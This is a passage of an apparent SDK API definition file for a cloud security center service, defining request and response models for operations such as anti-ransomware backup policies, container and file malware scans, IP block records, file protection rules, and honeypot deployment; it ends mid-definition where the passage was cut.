async function createAntiBruteForceRule(request: CreateAntiBruteForceRuleRequest): CreateAntiBruteForceRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateAntiBruteForceRule', 'POST', '/', 'json', false, 'json', request);
}

model CreateAssetSelectionConfigRequest {
  businessType: string(name='BusinessType', description='The business type that you want to select for the asset. Valid values:

*   **VIRUS_SCAN_CYCLE_CONFIG**: virus detection configuration
*   **VIRUS_SCAN_ONCE_TASK**: one-time scan for virus detection', example='VIRUS_SCAN_CYCLE_CONFIG', position='Query'),
  targetType: string(name='TargetType', description='The dimension based on which you want to select the asset. Valid values:

*   **instance**: selects the asset by server.
*   **group**: selects the asset by group.
*   **vpc**: selects the asset by virtual private cloud (VPC).', example='vpc', position='Query'),
}

model CreateAssetSelectionConfigResponseBody = {
  data?: {
    businessType?: string(name='BusinessType', description='The business type that is selected for the asset. Valid values:

*   **VIRUS_SCAN_CYCLE_CONFIG**: virus detection configuration
*   **VIRUS_SCAN_ONCE_TASK**: one-time scan for virus detection', example='VIRUS_SCAN_CYCLE_CONFIG'),
    selectionKey?: long(name='SelectionKey', description='The ID of the current asset selection. It can be used to query and modify the asset that is selected.', example='53e93435-d694-4c03-9ce7-da12bee1****'),
    targetType?: string(name='TargetType', description='The dimension based on which the asset is selected. Valid values:

*   **group**: The asset is selected by server.
*   **group**: The asset is selected by group.
*   **vpc**: The asset is selected by VPC.', example='group'),
  }(name='Data', description='The response parameters.'),
  requestId?: string(name='RequestId', description='The request ID.', example='A3D7C47D-3F11-57BB-90E8-E5C20C619F37'),
}

model CreateAssetSelectionConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateAssetSelectionConfigResponseBody(name='body'),
}

async function createAssetSelectionConfig(request: CreateAssetSelectionConfigRequest): CreateAssetSelectionConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateAssetSelectionConfig', 'POST', '/', 'json', false, 'json', request);
}

model CreateBackupPolicyRequest {
  name: string(name='Name', description='The name of the anti-ransomware policy.', example='ServerBackUpPolicy01', position='Query'),
  policy: map[string]any(name='Policy', description='*   **IsDefault**: the type of the anti-ransomware policy. Valid values:

    *   **1**: recommended policy
    *   **0**: custom policy

*   **Include**: the format of the files that you want to protect. If you want to protect the files in all formats, set this field to \\[].

*   **Source**: the directory that you want to protect. If you want to protect all directories, set this field to \\[].

*   **ExcludeSystemPath**: specifies whether to exclude a specific directory from the anti-ransomware policy. If you want to exclude a directory, set this field to **true**. If you do not want to exclude a directory, leave this field empty.

*   **Exclude**: the directory that you want to exclude from the anti-ransomware policy. If you do not want to exclude a directory, set this field to \\[].

*   **Schedule**: the start time and interval of a data backup task. We recommend that you specify a start time that begins during off-peak hours but does not start on the hour. Examples:

    *   If you set this field to I|1583216092|P21D, the data backup task starts from 2020-03-03 14:14:52, and the task is run at an interval of three weeks.
    *   If you set this field to I|1583216092|PT24H, the data backup task starts from 2020-03-03 14:14:52, and the task is run at an interval of 24 hours.

*   **Retention**: the period during which backup data is retained. Unit: days. If you set this field to 7, backup data is retained for a week. If you set this field to 365, backup data is retained for a year. If you set this field to -1, backup data is permanently retained.

*   **SpeedLimiter**: the limit on the network bandwidth for data backup tasks. If you set this field to 0:24:30720, the maximum bandwidth for a data backup task is 30 MB/s from 00:00 to 24:00.

*   **UseVss**: specifies whether to enable the VSS feature. The feature is available only for Windows servers. Valid values:

    *   **true**: yes
    *   **false**: no

>  The VSS feature is available only if you create the anti-ransomware policy for Windows servers. After you enable the feature, the number of backup failures due to running processes is significantly reduced. We recommend that you enable the VSS feature. After you enable the feature, the data of disks that are in the exFAT and FAT32 formats cannot be backed up.', example='"{"IsDefault":1,"Include":[],"Source":[],"Schedule":"I|1648061040|PT24H","Retention":7,"SpeedLimiter":"","ExcludeSystemPath":true,"Exclude":["/bin/","/usr/bin/","/sbin/","/boot/","/proc/","/sys/","/srv/","/lib/","/selinux/","/usr/sbin/","/run/","/lib32/","/lib64/","/lost+found/","/var/lib/kubelet/","/var/lib/ntp/proc","/var/lib/container","Windows","Python27","Program Files (x86)","Program Files","Boot","$RECYCLE.BIN","System Volume Information","Users\\Administrator\\NTUSER.DAT*","ProgramData","pagefile.sys","Users\\Default\\NTUSER.DAT*","Users\\Administrator\\ntuser.*"],"UseVss":true}"', shrink='json', position='Query'),
  policyRegionId?: string(name='PolicyRegionId', description='The region ID of the server that is not deployed on Alibaba Cloud.

>  We recommend that you specify the ID of the supported region that is the nearest to the location of the server. You can call the [DescribeSupportRegion](~~DescribeSupportRegion~~) operation to query the supported regions of the anti-ransomware feature.', example='ch-hangzhou', position='Query'),
  policyVersion: string(name='PolicyVersion', description='The version of the anti-ransomware policy. Set the value to **2.0.0**.', example='2.0.0', position='Query'),
  uuidList: [ string ](name='UuidList', description='The UUIDs of the servers that you want to protect.', example='["3bb30859-b3b5-4f28-868f-b0892c98****", "3bb30859-b3b5-4f28-868f-b0892c98****"]', position='Query'),
}

model CreateBackupPolicyResponseBody = {
  backupPolicy?: {
    id?: string(name='Id', description='The ID of the anti-ransomware policy.', example='1301575'),
    status?: string(name='Status', description='The status of the anti-ransomware policy. Valid values:

*   **enabled**
*   **disabled**

>  After you create an anti-ransomware policy, the policy is enabled by default.', example='enabled'),
  }(name='BackupPolicy', description='The information about the anti-ransomware policy.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model CreateBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateBackupPolicyResponseBody(name='body'),
}

async function createBackupPolicy(request: CreateBackupPolicyRequest): CreateBackupPolicyResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateBackupPolicy', 'POST', '/', 'json', false, 'json', request);
}

model CreateContainerScanTaskRequest {
  clusterId?: string(name='ClusterId', description='The ID of the cluster to which the container belongs.

> You can call the [DescribeGroupedContainerInstances](~~182997~~) operation to query the IDs of clusters.', example='c22143730ab6e40b09ec7c1c51d4d****', position='Query'),
  containerIds?: string(name='ContainerIds', description='The ID of the container.', example='c927cf190e886696db53cda0efb57145394ccf0bf9f525353fa5c22a26e4****', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
}

model CreateContainerScanTaskResponseBody = {
  data?: {
    canCreate?: boolean(name='CanCreate', description='Indicates whether you can create more scan tasks.', example='true'),
    collectTime?: long(name='CollectTime', description='The collection time.', example='1644286364150'),
    execTime?: long(name='ExecTime', description='The execution time of the task.', example='1644286364150'),
    finishCount?: int32(name='FinishCount', description='The number of scan tasks that are complete.', example='33'),
    progress?: int32(name='Progress', description='The progress of the task.', example='100'),
    result?: string(name='Result', description='The execution result of the task.', example='SUCCESS'),
    status?: string(name='Status', description='The status of the task.', example='SUCCESS'),
    taskId?: string(name='TaskId', description='The ID of the task.', example='fc98d58eb56f699d49bf7ebbd6d7****'),
    totalCount?: int32(name='TotalCount', description='The total number of scan tasks.', example='62'),
  }(name='Data', description='The data returned.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9F4E6157-9600-5588-86B9-38F09067****'),
}

model CreateContainerScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateContainerScanTaskResponseBody(name='body'),
}

async function createContainerScanTask(request: CreateContainerScanTaskRequest): CreateContainerScanTaskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateContainerScanTask', 'POST', '/', 'json', false, 'json', request);
}

model CreateContainerScanTaskByAppNameRequest {
  appNames?: string(name='AppNames', description='The name of the container application.', example='app-centos-01', position='Query'),
  clusterId?: string(name='ClusterId', description='The cluster ID.', example='cfb7a55a81f7246b5ac18845ea79a****', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response.

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
}

model CreateContainerScanTaskByAppNameResponseBody = {
  data?: {
    canCreate?: boolean(name='CanCreate', description='Indicates whether you can create more scan tasks. Valid values:

*   **true**
*   **false**', example='true'),
    collectTime?: long(name='CollectTime', description='The timestamp generated when the image information was collected. Unit: milliseconds.', example='1644286364150'),
    execTime?: long(name='ExecTime', description='The timestamp generated when the scan task started. Unit: milliseconds.', example='1644286364150'),
    finishCount?: int32(name='FinishCount', description='The number of container applications that are scanned.', example='5'),
    progress?: int32(name='Progress', description='The progress of the scan task in percentage.', example='100'),
    result?: string(name='Result', description='The result of the scan task. Valid values:

*   **SUCCESS**: The task is successful.
*   **TASK_NOT_SUPPORT_REGION**: The task is not supported in the region where the image is deployed.

>', example='SUCCESS'),
    status?: string(name='Status', description='The status of the scan task. Valid values:

*   **INIT**: The task is being initialized.
*   **PRE_ANALYZER**: The task is being pre-processed.
*   **SUCCESS**: The task succeeds.
*   **FAIL**: The task fails.', example='SUCCESS'),
    taskId?: string(name='TaskId', description='The ID of the scan task.', example='fc98d58eb56f699d49bf7ebbd6d7****'),
    totalCount?: int32(name='TotalCount', description='The total number of container applications that you want to scan.', example='5'),
  }(name='Data', description='The data returned if the request was successful.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  requestId?: string(name='RequestId', description='The request ID.', example='1EE7B150-D67E-53FD-A52D-3E8E669A****'),
}

model CreateContainerScanTaskByAppNameResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateContainerScanTaskByAppNameResponseBody(name='body'),
}

async function createContainerScanTaskByAppName(request: CreateContainerScanTaskByAppNameRequest): CreateContainerScanTaskByAppNameResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateContainerScanTaskByAppName', 'POST', '/', 'json', false, 'json', request);
}

model CreateCustomBlockRecordRequest {
  blockIp: string(name='BlockIp', description='The IP address that you want to specify in the policy.', example='192.168.xx.xx', position='Query'),
  bound: string(name='Bound', description='The traffic direction that you want to specify in the policy. Valid values:

*   **in**: inbound
*   **out**: outbound', example='in', position='Query'),
  expireTime: long(name='ExpireTime', description='The expiration time of the policy.', example='1859094550000', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  uuids: string(name='Uuids', description='The UUIDs of the servers. Separate multiple UUIDs with commas (,).', example='71c846d6-5c84-4714-acfc-58265bc3****,5013b5e8-1613-43a8-b4de-651db318****,df53f0ad-b3ba-4fe0-9ec7-f42a2ae2****', position='Query'),
}

model CreateCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='30CBF632-109F-596F-97F2-451C8B2A****'),
}

model CreateCustomBlockRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateCustomBlockRecordResponseBody(name='body'),
}

async function createCustomBlockRecord(request: CreateCustomBlockRecordRequest): CreateCustomBlockRecordResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateCustomBlockRecord', 'POST', '/', 'json', false, 'json', request);
}

model CreateCycleTaskRequest {
  enable: int32(name='Enable', description='Specifies whether to enable the task. Valid values:

*   **1**: yes
*   **0**: no', example='1', position='Query'),
  firstDateStr: long(name='FirstDateStr', description='The first time when the task is performed.', example='1650556800000', position='Query'),
  intervalPeriod: int32(name='IntervalPeriod', description='The interval of the task.', example='7', position='Query'),
  param?: string(name='Param', description='The additional information.', example='{
      "targetInfo": [
            {
                  "type": "groupId",
                  "name": "TI HOST",
                  "target": 10597***
            },
            {
                  "type": "groupId",
                  "name": "expense HOST",
                  "target": 10597***
            }
      ]
}', position='Query'),
  periodUnit: string(name='PeriodUnit', description='The unit of the scan interval. Valid values:

*   **day**: days
*   **hour**: hours', example='day', position='Query'),
  source?: string(name='Source', description='The additional source for the task.', example='console_batch', position='Query'),
  targetEndTime: int32(name='TargetEndTime', description='The time when the task ends. Unit: hours.', example='6', position='Query'),
  targetStartTime: int32(name='TargetStartTime', description='The time when the task is started. Unit: hours.', example='0', position='Query'),
  taskName: string(name='TaskName', description='The name of the task. Valid values:

*   **VIRUS_VUL_SCHEDULE_SCAN**: virus scan task
*   **IMAGE_SCAN**: image scan task
*   **EMG_VUL_SCHEDULE_SCAN**: urgent vulnerability scan task', example='EMG_VUL_SCHEDULE_SCAN', position='Query'),
  taskType: string(name='TaskType', description='The type of the task. Valid values:

*   **VIRUS_VUL_SCHEDULE_SCAN**: virus scan task
*   **IMAGE_SCAN**: image scan task
*   **EMG_VUL_SCHEDULE_SCAN**: urgent vulnerability scan task', example='VIRUS_VUL_SCHEDULE_SCAN', position='Query'),
}

model CreateCycleTaskResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='86CFF42E-E00A-57A3-8656-22291EFB****'),
}

model CreateCycleTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateCycleTaskResponseBody(name='body'),
}

async function createCycleTask(request: CreateCycleTaskRequest): CreateCycleTaskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateCycleTask', 'POST', '/', 'json', false, 'json', request);
}

model CreateFileDetectRequest {
  downloadUrl?: string(name='DownloadUrl', description='The URL that is used to download the file. You can specify this parameter to trigger file detection without the need to upload the file in advance.', example='https://xxxxxxxx.oss-cn-hangzhou-1.aliyuncs.com/xxxxx/xxxxxxxxxxxxxx?Expires=1671448125&OSSAccessKeyId=xxx', position='Query'),
  hashKey: string(name='HashKey', description='The identifier of the file. Only MD5 hash values are supported.', example='0a212417e65c26ff133cfff28f6c****', position='Query'),
  ossKey?: string(name='OssKey', description='The key of the file that is stored in the Object Storage Service (OSS) bucket. If you specify the DownloadUrl parameter, you can leave this parameter empty. You can call the [CreateFileDetectUploadUrl](~~CreateFileDetectUploadUrl~~) operation to query the keys of files.', example='1/2022/06/23/15/41/16559701077444693a0c6-33b2-4cc2-a99f-9f38b8b8****', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='115.213.XX.XX', position='Query'),
  type: int32(name='Type', description='The type of the file. Valid values:

*   **0**: unknown files
*   **1**: binary files
*   **2**: webshell files
*   **4**: script files

>  If you do not know the type of the file, set this parameter to 0.', example='0', position='Query'),
}

model CreateFileDetectResponseBody = {
  hashKey?: string(name='HashKey', description='The identifier of the file.', example='0a212417e65c26ff133cfff28f6c****'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model CreateFileDetectResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateFileDetectResponseBody(name='body'),
}

/**
  * You can call this operation to push a file to the cloud for detection. Before you call this operation, make sure that the file is uploaded. You can call the CreateFileDetectUploadUrl operation to upload the file.
  * The HashKey parameter is included in all API operations that are related to the file detection feature. The parameter specifies the unique identifier of a file. Only hexadecimal MD5 hash values of complete file content are supported. You must calculate the MD5 hash value before you call this operation.
  * To calculate the hexadecimal MD5 hash value for a file, you can perform the following steps:
  * 1\\. Use the MD5 algorithm to encrypt data and generate a 128-bit hash value. You can use a tool such as MessageDigest for Java and the hashlib module for Python.
  * 2\\. Convert the hash value to a hexadecimal string. You can use a tool such as Codec for Java and the hex() function for Python.
  *
 */
async function createFileDetect(request: CreateFileDetectRequest): CreateFileDetectResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateFileDetect', 'POST', '/', 'json', false, 'json', request);
}

model CreateFileDetectUploadUrlRequest {
  hashKeyContextList?: [ 
    {
      fileSize?: int32(name='FileSize', description='The size of the file. Unit: bytes.', example='2698557'),
      hashKey?: string(name='HashKey', description='The hash value of the file.', example='30319dd5cee8f894766e479cac170da0'),
    }
  ](name='HashKeyContextList', description='The hash values of files.

> You must specify at least one of the **HashKeyList** and **HashKeyContextList** parameters.', position='Query'),
  hashKeyList?: [ string ](name='HashKeyList', description='The identifiers of files. Only MD5 hash values are supported.

> You must specify at least one of the **HashKeyList** and **HashKeyContextList** parameters.', example='CreateFileDetectUploadUrl', position='Query'),
  type: int32(name='Type', description='The type of the file. Valid values:

*   **0**: unknown file
*   **1**: binary file
*   **2**: webshell file
*   **4**: script file

> If you do not know the type of the file, set this parameter to **0**.', example='0', position='Query'),
}

model CreateFileDetectUploadUrlResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8BF6F'),
  uploadUrlList?: [ 
    {
      code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
      context?: {
        accessId?: string(name='AccessId', description='The AccessKey ID that is used to access the OSS bucket.', example='LTAI4G1mgPbjvGQuiV1X****'),
        ossKey?: string(name='OssKey', description='The key of the file that is used after the file is uploaded to the OSS bucket.', example='1/2022/06/23/15/41/16559701077444693a0c6-33b2-4cc2-a99f-9f38b8b8****'),
        policy?: string(name='Policy', description='The policy that poses limits on file upload. For example, the policy can limit the size of the file.', example='eyJleHBpcmF0aW9uIjoiMjAyMi0wNy0yM1QxMDo1ODoxMC43NTNaIiwiY29uZGl0aW9ucyI6W1siY29udGVudC1sZW5ndGgtcmFuZ2UiLDAsMjA5NzE1MjBdLFsiZXEiLCIka2V5IiwiMS8yMDIyLzA2LzIzLzE4LzU4LzE2NTU5ODE4OTA3NTM4NTc2MjFkNS1kN2E1LTQ5YzAtOGJjZi0yMTMyY2JiYTdmYzMi****'),
        signature?: string(name='Signature', description='The signature that is used to upload the file.', example='wDhPgVdnY/bkKFYcYFl+4crl****'),
      }(name='Context', description='The signature information.'),
      expire?: string(name='Expire', description='The timestamp when the values of the parameters expire. Unit: milliseconds.', example='1658562101370'),
      fileExist?: boolean(name='FileExist', description='Indicates whether the file exists in the cloud. Valid values:

*   **true**: The file exists in the cloud. You do not need to upload the file.
*   **false**: The file does not exist in the cloud. You must upload the file.', example='false'),
      hashKey?: string(name='HashKey', description='The identifier of the file.', example='0a212417e65c26ff133cfff28f6c****'),
      internalUrl?: string(name='InternalUrl', description='The internal endpoint of the URL to which the file is uploaded.', example='http://example.com'),
      message?: string(name='Message', description='The error message returned.', example='successful'),
      publicUrl?: string(name='PublicUrl', description='The public endpoint of the URL to which the file is uploaded.', example='http://example.com'),
    }
  ](name='UploadUrlList', description='An array consisting of the parameters that are required to upload a file.'),
}

model CreateFileDetectUploadUrlResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateFileDetectUploadUrlResponseBody(name='body'),
}

/**
  * You can call this operation to query the parameters that are required to upload a file for detection. If the value of the response parameter FileExist is true, the file that you want to upload for detection already exists in the cloud. In this case, you can directly push the file for detection. If the value of the response parameter FileExist is false, you must use the form upload method to upload the file to the specified Object Storage Service (OSS) bucket based on the response parameters of this operation.
  * The form upload method is provided by OSS. For more information, see [Form upload](~~84788~~).
  * The HashKey parameter is included in all API operations that are related to the file detection feature. The parameter specifies the unique identifier of a file. Only MD5 hash values are supported. Before you call this operation, calculate the MD5 hash value of the file.
  *
 */
async function createFileDetectUploadUrl(request: CreateFileDetectUploadUrlRequest): CreateFileDetectUploadUrlResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateFileDetectUploadUrl', 'POST', '/', 'json', false, 'json', request);
}

model CreateFileProtectRuleRequest {
  alertLevel?: int32(name='AlertLevel', description='The severity of alerts. Valid values:

*   0: does not generate alerts
*   1: sends notifications
*   2: suspicious
*   3: high-risk', example='0', position='Query'),
  fileOps: [ string ](name='FileOps', description='The operations that you want to perform on the files.', position='Query'),
  filePaths: [ string ](name='FilePaths', description='The paths to the files that you want to monitor. Wildcard characters are supported.', position='Query'),
  procPaths: [ string ](name='ProcPaths', description='The paths to the processes that you want to monitor. Wildcard characters are supported.', position='Query'),
  ruleAction: string(name='RuleAction', description='The handling method of the rule. Valid values:

*   pass: allow
*   alert', example='pass', position='Query'),
  ruleName: string(name='RuleName', description='The name of the rule.', example='tetsRule', position='Query'),
  status?: int32(name='Status', description='Specifies whether to enable the rule. Valid values:

*   **1**: yes
*   **0**: no', example='1', position='Query'),
  switchId?: string(name='SwitchId', description='The switch ID of the rule.', example='FILE_PROTECT_RULE_SWITCH_TYPE_0000', position='Query'),
}

model CreateFileProtectRuleResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='EC7C8984-D108-516F-9D36-3DF1D1228CCA'),
  ruleId?: long(name='RuleId', description='The ID of the rule.', example='123'),
}

model CreateFileProtectRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateFileProtectRuleResponseBody(name='body'),
}

async function createFileProtectRule(request: CreateFileProtectRuleRequest): CreateFileProtectRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateFileProtectRule', 'POST', '/', 'json', false, 'json', request);
}

model CreateFileUploadLimitRequest {
  limit: long(name='Limit', description='The QPS limit on the files uploaded from the client. Valid values: 100 to 10000.', example='100', position='Query'),
}

model CreateFileUploadLimitResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
}

model CreateFileUploadLimitResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateFileUploadLimitResponseBody(name='body'),
}

async function createFileUploadLimit(request: CreateFileUploadLimitRequest): CreateFileUploadLimitResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateFileUploadLimit', 'POST', '/', 'json', false, 'json', request);
}

model CreateHoneypotRequest {
  honeypotImageId: string(name='HoneypotImageId', description='The ID of the honeypot image.

> You can call the [ListAvailableHoneypot](~~ListAvailableHoneypot~~) operation to query the IDs of images from the **HoneypotImageId** response parameter.', example='sha256:ebc4c102ac407d53733c2373e8888a733ddce86f163ccbe7492ae1cbf26****', position='Query'),
  honeypotImageName: string(name='HoneypotImageName', description='The name of the honeypot image.

> You can call the [ListAvailableHoneypot](~~ListAvailableHoneypot~~) operation to query the names of images from the **HoneypotImageName** response parameter.', example='HoneyPotImageName', position='Query'),
  honeypotName: string(name='HoneypotName', description='The custom name of the honeypot.', example='ruoyi', position='Query'),
  meta?: string(name='Meta', description='The custom configuration of the honeypot in the JSON format. The value contains the following fields:

*   **trojan_git**: Git-specific Defense. Valid values:

    *   **zip**: Git Source Code Package
    *   **web**: Git Directory Leak
    *   **close**: Disabled

*   **trojan_git_addr**: Git Trojan Address.

*   **trojan_git.zip**: Git Trojan.

*   **burp**: Burp-specific Defense. Valid values:

    *   **open**: Enable
    *   **close**: Disable

*   **portrait_option**: Source Tracing Configuration. Valid values:

    *   **false**: Disable
    *   **true**: Enable', example='{\\"trojan_git\\":\\"close\\",\\"burp\\":\\"close\\",\\"portrait_option\\":\\"false\\"}', position='Query'),
  nodeId: string(name='NodeId', description='The ID of the management node.

> You can call the [ListHoneypotNode](~~ListHoneypotNode~~) operation to query the IDs of management nodes.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****', position='Query'),
}

model CreateHoneypotResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    controlNodeName?: string(name='ControlNodeName', description='The name of the management node.', example='managerNodename'),
    honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.', example='9bf8cd373112263d4bc102fc5dba9d9f812ee05d4d35c487d330d52e937f****'),
    honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', description='The display name of the honeypot image.', example='HoneyDisplayName'),
    honeypotImageName?: string(name='HoneypotImageName', description='The name of the honeypot image.', example='tcp_proxy'),
    honeypotName?: string(name='HoneypotName', description='The custom name of the honeypot.', example='ruoyi'),
    nodeId?: string(name='NodeId', description='The ID of the management node.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
    presetId?: string(name='PresetId', description='The ID of the custom configuration for the honeypot.', example='ddh3731641137fe4b72b245346a2721d4b6tdgg3731641137fe4b72b245346a2721***'),
    state?: [ string ](name='State', description='An array that consists of the status information about the honeypot.'),
  }(name='Data', description='The information about the honeypot.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='29874225-EAAC-5415-8501-32DD20FD29F6'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model CreateHoneypotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateHoneypotResponseBody(name='body'),
}

async function createHoneypot(request: CreateHoneypotRequest): CreateHoneypotResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateHoneypot', 'POST', '/', 'json', false, 'json', request);
}

model CreateHoneypotNodeRequest {
  allowHoneypotAccessInternet?: boolean(name='AllowHoneypotAccessInternet', description='Specifies whether to allow honeypots to access the Internet. Valid values:

*   **true**: allows honeypots to access the Internet.
*   **false**: does not allow honeypots to access the Internet.', example='true', position='Query'),
  availableProbeNum?: int32(name='AvailableProbeNum', description='The number of available probes.', example='20', position='Query'),
  nodeName: string(name='NodeName', description='The name of the management node.', example='manageNode', position='Query'),
  securityGroupProbeIpList?: [ string ](name='SecurityGroupProbeIpList', description='The CIDR blocks that are allowed to access the management node.', position='Query'),
}

model CreateHoneypotNodeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  honeypotNode?: {
    nodeId?: string(name='NodeId', description='The ID of the management node.', example='37a15ff1-3475-4897-aa6c-f7fd9122****'),
  }(name='HoneypotNode', description='The data returned.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='028CF634-5268-5660-9575-48C9ED6BF880'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model CreateHoneypotNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateHoneypotNodeResponseBody(name='body'),
}

async function createHoneypotNode(request: CreateHoneypotNodeRequest): CreateHoneypotNodeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateHoneypotNode', 'POST', '/', 'json', false, 'json', request);
}

model CreateHoneypotPresetRequest {
  honeypotImageName: string(name='HoneypotImageName', description='The name of the honeypot image.', example='webmin', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  meta: string(name='Meta', description='The custom configurations of the honeypot template. The value is a JSON string that contains the following fields:

*   **portrait_option**: Social Source Tracing
*   **burp**: Burp-specific Defense
*   **trojan_git**: Git-specific Defense', example='{"burp":"close","trojan_git":"close","portrait_option":"true"}', position='Query'),
  nodeId: string(name='NodeId', description='The ID of the management node to which you want to deploy honeypots.

> You can call the [ListHoneypotNode](~~ListHoneypotNode~~) operation to query the IDs of management nodes.', example='9373fe59-74d5-4505-bb24-c85352fb****', position='Query'),
  presetName: string(name='PresetName', description='The custom name of the honeypot template.', example='WebMin-online', position='Query'),
}

model CreateHoneypotPresetResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  honeypotPreset?: {
    honeypotPresetId?: string(name='HoneypotPresetId', description='The ID of the honeypot template.', example='d6ece172-34d9-4942-99a4-b309cb55xxxx'),
  }(name='HoneypotPreset', description='The creation result.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7C1C6E65-C8B9-54C9-9F92-2F5E51C4E16D'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model CreateHoneypotPresetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateHoneypotPresetResponseBody(name='body'),
}

async function createHoneypotPreset(request: CreateHoneypotPresetRequest): CreateHoneypotPresetResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateHoneypotPreset', 'POST', '/', 'json', false, 'json', request);
}

model CreateHoneypotProbeRequest {
  arp?: boolean(name='Arp', description='Specifies whether to enable Address Resolution Protocol (ARP) spoofing. Valid values:

*   **true**: yes
*   **false**: no', example='true', position='Query'),
  businessGroupId?: string(name='BusinessGroupId', description='The ID of the business group.', example='2022011817324588686', position='Query'),
  controlNodeId: string(name='ControlNodeId', description='The ID of the management node.

> You can call the [ListHoneypotNode](~~ListHoneypotNode~~) operation to query the IDs of management nodes.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****', position='Query'),
  displayName: string(name='DisplayName', description='The name of the probe.', example='testHoneyPotProbe', position='Query'),
  honeypotBindList?: [ 
    {
      bindPortList?: [ 
        {
          bindPort?: boolean(name='BindPort', description='Specifies whether to bind a port. Valid values:

*   **true**: yes
